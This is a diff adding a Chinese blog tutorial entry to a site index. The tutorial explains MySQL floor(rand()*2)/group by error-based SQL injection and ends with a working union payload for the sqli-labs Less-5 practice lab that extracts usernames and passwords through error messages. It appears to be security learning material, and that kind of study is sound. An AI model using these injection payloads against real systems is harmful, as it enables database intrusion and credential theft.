@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>SQL注入（6）：floor报错</title>
+      <link href="/2023/04/10/SQL%E6%B3%A8%E5%85%A5%EF%BC%886%EF%BC%89%EF%BC%9Afloor%E6%8A%A5%E9%94%99/"/>
+      <url>/2023/04/10/SQL%E6%B3%A8%E5%85%A5%EF%BC%886%EF%BC%89%EF%BC%9Afloor%E6%8A%A5%E9%94%99/</url>
+      
+        <content type="html"><![CDATA[<h2 id="涉及到的函数">涉及到的函数</h2><ul><li>rand()函数：随机返回0～1之间的小数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure><p>计算结果在0～1之间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand()*2;</span><br></pre></td></tr></table></figure><p>计算结果在0～2之间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand() from users;</span><br></pre></td></tr></table></figure><p>根据表users的行数随机显示结果</p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304101722772.png" alt="image-20230410172210731" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand(num);</span><br></pre></td></tr></table></figure><p>将数字num作为种子生成随机数，将可能产生相同的随机数</p><ul><li>floor()函数：小数向下取整数。ceiling()：向上取整数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2);</span><br></pre></td></tr></table></figure><p>结果随机为0或者1</p><ul><li>concat_ws()：将括号内数据用第一个字段连接起来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;-&#x27;, (select database()), floor(rand()*2)) from users;</span><br></pre></td></tr></table></figure><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304101734955.png" alt="image-20230410173406925" style="zoom:67%;" /><ul><li>group by：分组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;-&#x27;, (select database()), floor(rand()*2)) as a from users group by a;</span><br></pre></td></tr></table></figure><p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304101736782.png" alt="image-20230410173649755"></p><ul><li>count()：汇总统计数量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;-&#x27;, (select database()), floor(rand()*2)) as a from users group by a;</span><br></pre></td></tr></table></figure><p>利用这个命令我们可以统计分组后各自的总数</p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304101740700.png" alt="image-20230410174042678" style="zoom:80%;" /><p><strong>但是</strong>，这个命令偶尔会报错</p><p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304101739264.png" alt="image-20230410173926239"></p><p>这里会出现我们的查询结果<code>security-1</code>，这个结果如果我们替换成我们需要的结果，就可以成功达到注入的效果。为了稳定触发这个报错，我们需要了解这个报错的触发原因。</p><ul><li>limit：用于显示指定行数</li></ul><h2 id="报错触发原理">报错触发原理</h2><p>报错的原因在于统计分组的时候，分组的名字即<code>security-1</code>、<code>security-2</code>发生了重复，导致了报错。</p><p>导致这个报错的真正原因在于：**rand函数在进行分组group by和统计count时可能会多次执行，导致键值key重复。**如何理解这句话呢？我们来阐述一下这整个统计过程</p><ol><li><code>floor(rand()*2)</code>产生了一列随机数</li><li>使用concat_ws进行拼接</li><li>group by和count进行统计数量，逐一统计计数</li></ol><p>问题出现在统计记数这个过程中：</p><p>统计时发现key值不存在时，会<strong>重新计算</strong><code>concat_ws('-', (select database()), floor(rand(0)*2)) </code>再填入key内。</p><ul><li>假设第一次rand得到的是<code>security-1</code>，发现不存在，然后重新计算得到<code>security-1</code>填入key的空位；</li><li>第二次我们rand得到了<code>security-0</code>，发现也不存在，然后重新计算得到<code>security-1</code>，但是<strong>仍然会填入key的空位中</strong></li></ul><p>这就导致了在统计表中出现了两个<code>security-1</code>的key，就导致了报错。</p><p>有了原理，我们就可以根据原理来稳定使得其报错。使用<code>rand(num)</code>得到不随机的随机数，然后尝试出稳定报错的<code>num</code>，再次构造上面的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;-&#x27;, (select database()), floor(rand(0)*2)) as a from users group by a;</span><br></pre></td></tr></table></figure><p><code>from users</code>的作用是产生足够多次的计算。在注入时，一般会使用行数比较多的默认数据表<code>information_schema.tables</code></p><p>这样就得到稳定能够报错的语句，到现在为止，我们只需要修改<code>(select database())</code>，改成我们需要的语句就可以利用报错注入SQL了。</p><h2 id="例子less-5">例子Less-5</h2><p>对于例子5，我们就直接构造出语句即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;, (select concat(&#x27;~&#x27;,id,username,&#x27;:&#x27;,password) from users limit 0,1), floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p>利用<code>limit 0,1</code>可以将数据逐行显示在错误内</p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304102247655.png" alt="image-20230410224752631" style="zoom:80%;" />]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入（5）：extractValue、updateXml报错注入</title>
       <link href="/2023/04/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%885%EF%BC%89%EF%BC%9AextractValue%E3%80%81updateXml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
       <url>/2023/04/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%885%EF%BC%89%EF%BC%9AextractValue%E3%80%81updateXml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
